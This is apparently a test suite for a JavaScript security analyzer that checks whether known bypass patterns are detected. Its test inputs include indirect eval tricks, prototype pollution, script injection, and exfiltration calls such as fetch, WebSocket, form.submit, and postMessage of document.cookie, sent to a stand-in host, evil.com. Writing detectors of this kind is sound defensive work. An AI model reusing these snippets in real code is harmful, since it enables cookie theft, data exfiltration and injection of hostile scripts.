/**
 * 攻撃パターン網羅テスト
 * 既知の攻撃手法を片っ端からぶつけて、検出できるか確認する
 */
import { describe, it, expect } from 'vitest'
import { analyzeCodeSecurity } from '../src/analyzer.js'

/** 指定ルールの violation が含まれることをアサート */
function expectViolation(code: string, rule: string) {
  const signals = analyzeCodeSecurity(code)
  const found = signals.detectedViolations.filter(v => v.rule === rule)
  expect(found.length, `"${rule}" が検出されるべき:\n${code}`).toBeGreaterThan(0)
}

/** なんらかの violation が含まれることをアサート（ルール不問） */
function expectAnyViolation(code: string) {
  const signals = analyzeCodeSecurity(code)
  expect(signals.detectedViolations.length, `何らかの violation が検出されるべき:\n${code}`).toBeGreaterThan(0)
}

// =============================================================================
// 1. eval 系バイパス
// =============================================================================
describe('eval 系バイパス', () => {
  it('直接 eval', () => {
    expectViolation(`eval('alert(1)')`, 'no-eval')
  })

  it('間接 eval: (0, eval)(...)', () => {
    expectViolation(`(0, eval)('alert(1)')`, 'no-eval')
  })

  it('間接 eval: window.eval(...)', () => {
    expectAnyViolation(`window.eval('alert(1)')`)
  })

  it('間接 eval: globalThis.eval(...)', () => {
    expectAnyViolation(`globalThis.eval('alert(1)')`)
  })

  it('tagged template: eval`code`', () => {
    expectAnyViolation("eval`alert(1)`")
  })

  it('Function コンストラクタ経由の間接 eval: [].constructor.constructor("...")()', () => {
    expectAnyViolation(`[].constructor.constructor('return fetch')()`)
  })
})

// =============================================================================
// 2. fetch / ネットワーク API バイパス
// =============================================================================
describe('fetch / ネットワーク API バイパス', () => {
  it('self.fetch(...)', () => {
    expectAnyViolation(`self.fetch('https://evil.com/steal')`)
  })

  it('Reflect.apply(fetch, ...)', () => {
    expectAnyViolation(`Reflect.apply(fetch, null, ['https://evil.com/steal'])`)
  })

  it('fetch.call(null, url)', () => {
    expectAnyViolation(`fetch.call(null, 'https://evil.com/steal')`)
  })

  it('fetch.bind(null)(url)', () => {
    expectAnyViolation(`fetch.bind(null)('https://evil.com/steal')`)
  })

  it('new EventSource("https://evil.com")', () => {
    expectAnyViolation(`new EventSource('https://evil.com/stream')`)
  })

  it('new WebSocket("wss://evil.com")', () => {
    expectAnyViolation(`new WebSocket('wss://evil.com/ws')`)
  })

  it('new Worker("https://evil.com/worker.js")', () => {
    expectAnyViolation(`new Worker('https://evil.com/worker.js')`)
  })

  it('new SharedWorker("https://evil.com/worker.js")', () => {
    expectAnyViolation(`new SharedWorker('https://evil.com/shared.js')`)
  })
})

// =============================================================================
// 3. センシティブ API 改ざんバイパス
// =============================================================================
describe('センシティブ API 改ざんバイパス', () => {
  it('self.fetch = malicious', () => {
    expectAnyViolation(`self.fetch = function() {}`)
  })

  it('Object.assign(window, { fetch: malicious })', () => {
    expectAnyViolation(`Object.assign(window, { fetch: function() {} })`)
  })

  it('Object.assign(globalThis, { fetch: malicious })', () => {
    expectAnyViolation(`Object.assign(globalThis, { fetch: function() {} })`)
  })

  it('Reflect.defineProperty(window, "fetch", ...)', () => {
    expectAnyViolation(`Reflect.defineProperty(window, 'fetch', { value: function() {} })`)
  })

  it('__proto__ 経由: window.__proto__.fetch = ...', () => {
    expectAnyViolation(`window.__proto__.fetch = function() {}`)
  })

  it('Object.getPrototypeOf(window).fetch = ...', () => {
    expectAnyViolation(`Object.getPrototypeOf(window).fetch = function() {}`)
  })
})

// =============================================================================
// 4. DOM 操作によるスクリプト注入
// =============================================================================
describe('DOM 操作によるスクリプト注入', () => {
  it('document.write("<script>...")', () => {
    expectAnyViolation(`document.write('<script>alert(1)<\\/script>')`)
  })

  it('document.writeln("<script>...")', () => {
    expectAnyViolation(`document.writeln('<script>alert(1)<\\/script>')`)
  })

  it('document.body.appendChild(script)', () => {
    // createElement('script') は既に検出される。body.appendChild 自体の検出
    expectAnyViolation(`
      const s = document.createElement('script')
      s.src = 'https://evil.com/malicious.js'
      document.body.appendChild(s)
    `)
  })

  it('document.body.insertBefore(script, ...)', () => {
    expectAnyViolation(`
      const s = document.createElement('script')
      document.body.insertBefore(s, null)
    `)
  })

  it('DOMParser で HTML パース', () => {
    expectAnyViolation(`new DOMParser().parseFromString('<img onerror=alert(1)>', 'text/html')`)
  })

  it('Range.createContextualFragment', () => {
    expectAnyViolation(`document.createRange().createContextualFragment('<script>alert(1)<\\/script>')`)
  })
})

// =============================================================================
// 5. データ送信・情報漏洩
// =============================================================================
describe('データ送信・情報漏洩', () => {
  it('window.open("https://evil.com?data=...")', () => {
    expectAnyViolation(`window.open('https://evil.com/collect?data=secret')`)
  })

  it('location.href = "https://evil.com?data=..."', () => {
    expectAnyViolation(`location.href = 'https://evil.com/collect?data=secret'`)
  })

  it('location.replace("https://evil.com?data=...")', () => {
    expectAnyViolation(`location.replace('https://evil.com/collect?data=secret')`)
  })

  it('Blob URL からの Worker 実行', () => {
    expectAnyViolation(`
      const blob = new Blob(['fetch("https://evil.com")'], { type: 'text/javascript' })
      const url = URL.createObjectURL(blob)
      new Worker(url)
    `)
  })

  it('form.action で外部送信', () => {
    expectAnyViolation(`
      const form = document.createElement('form')
      form.action = 'https://evil.com/collect'
      form.method = 'POST'
      document.body.appendChild(form)
      form.submit()
    `)
  })

  it('a.href + click() で外部遷移', () => {
    expectAnyViolation(`
      const a = document.createElement('a')
      a.href = 'https://evil.com/collect?data=secret'
      a.click()
    `)
  })
})

// =============================================================================
// 6. プロトタイプ汚染バイパス
// =============================================================================
describe('プロトタイプ汚染バイパス', () => {
  it('Object.prototype["isAdmin"] = true (computed property)', () => {
    expectViolation(`Object.prototype["isAdmin"] = true`, 'no-prototype-pollution')
  })

  it('Object.defineProperty(Array.prototype, "last", ...)', () => {
    expectAnyViolation(`Object.defineProperty(Array.prototype, 'last', { value: function() {} })`)
  })

  it('Reflect.set(Object.prototype, "isAdmin", true)', () => {
    expectAnyViolation(`Reflect.set(Object.prototype, 'isAdmin', true)`)
  })

  it('obj.__proto__.polluted = true', () => {
    expectAnyViolation(`({}).__proto__.polluted = true`)
  })
})

// =============================================================================
// 7. WebRTC / その他の通信チャネル
// =============================================================================
describe('WebRTC / その他の通信チャネル', () => {
  it('new RTCPeerConnection()', () => {
    expectAnyViolation(`new RTCPeerConnection()`)
  })

  it('new BroadcastChannel("exfil")', () => {
    expectAnyViolation(`new BroadcastChannel('exfil')`)
  })

  it('postMessage で外部送信', () => {
    expectAnyViolation(`parent.postMessage(document.cookie, '*')`)
  })
})

// =============================================================================
// 8. タイマー系バイパス
// =============================================================================
describe('タイマー系バイパス', () => {
  it('setTimeout(string) - テンプレートリテラル', () => {
    expectAnyViolation("setTimeout(`alert(1)`, 1000)")
  })

  it('window.setTimeout(string)', () => {
    expectAnyViolation(`window.setTimeout('alert(1)', 1000)`)
  })

  it('self.setTimeout(string)', () => {
    expectAnyViolation(`self.setTimeout('alert(1)', 1000)`)
  })
})

// =============================================================================
// 9. JavaScript Blob の中身検査
// =============================================================================
describe('JavaScript Blob の中身検査', () => {
  it('Blob 内にセンシティブ API → no-sensitive-api-override', () => {
    expectViolation(
      `new Blob(['fetch("https://example.com")'], { type: 'text/javascript' })`,
      'no-sensitive-api-override'
    )
  })

  it('Blob 内に非許可ドメイン URL → no-unauthorized-domain', () => {
    expectViolation(
      `new Blob(['importScripts("https://evil.com/payload.js")'], { type: 'text/javascript' })`,
      'no-unauthorized-domain'
    )
  })

  it('Blob 内にセンシティブ API も URL もない → no-javascript-blob', () => {
    expectViolation(
      `new Blob(['postMessage("done")'], { type: 'text/javascript' })`,
      'no-javascript-blob'
    )
  })

  it('type が javascript でない Blob → 違反なし', () => {
    const signals = analyzeCodeSecurity(
      `new Blob(['hello'], { type: 'text/plain' })`
    )
    const blobViolations = signals.detectedViolations.filter(
      v => v.rule === 'no-javascript-blob' || v.rule === 'no-sensitive-api-override'
    )
    expect(blobViolations.length).toBe(0)
  })
})
